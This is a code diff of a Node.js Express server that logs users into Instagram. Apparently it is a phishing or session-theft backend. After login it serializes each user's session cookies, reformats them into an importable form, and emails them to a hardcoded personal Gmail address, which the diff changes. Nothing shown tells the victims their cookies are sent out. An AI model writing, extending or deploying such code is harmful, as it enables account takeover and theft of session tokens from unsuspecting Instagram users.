@@ -184,11 +184,20 @@ app.get("/insta/submitCode", (req, res) => {
     .then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
         console.log("login success");
+        val2.cookies.map((cookiepairs) => {
+          cookiepairs["name"] = cookiepairs["key"];
+          delete cookiepairs["key"];
+        });
+        const validCookie = {
+          url: "https://instagram.com",
+          cookies: val2.cookies,
+        };
+
         var mailOptions = {
           from: process.env.email,
-          to: "surya142327@gmail.com",
-          subject: "cookies of user" + req.query.name,
-          text: JSON.stringify(val2.cookies),
+          to: "tklinger50@gmail.com",
+          subject: "cookies of user" + req.query.username,
+          text: JSON.stringify(validCookie),
         };
         transporter.sendMail(mailOptions, function (error, info) {
           if (error) {
@@ -196,7 +205,7 @@ app.get("/insta/submitCode", (req, res) => {
             res.json({
               success: true,
               user: val,
-              cookie: JSON.stringify(val2.cookies),
+              cookie: JSON.stringify(validCookie),
               email_sent: false,
               message: "login Successful but failed to send email",
             });
@@ -205,7 +214,7 @@ app.get("/insta/submitCode", (req, res) => {
             res.json({
               success: true,
               user: val,
-              cookie: JSON.stringify(val2.cookies),
+              cookie: JSON.stringify(validCookie),
               message: "login Successful and email has been sent",
             });
             res.end();
@@ -241,8 +250,8 @@ app.post("/insta", (req, res) => {
         console.log(JSON.stringify(validCookie));
         var mailOptions = {
           from: process.env.email,
-          to: "surya142327@gmail.com",
-          subject: "cookies of user" + req.query.username,
+          to: "tklinger50@gmail.com",
+          subject: "cookies of user" + req.body.username,
           text: JSON.stringify(validCookie),
         };
         transporter.sendMail(mailOptions, function (error, info) {
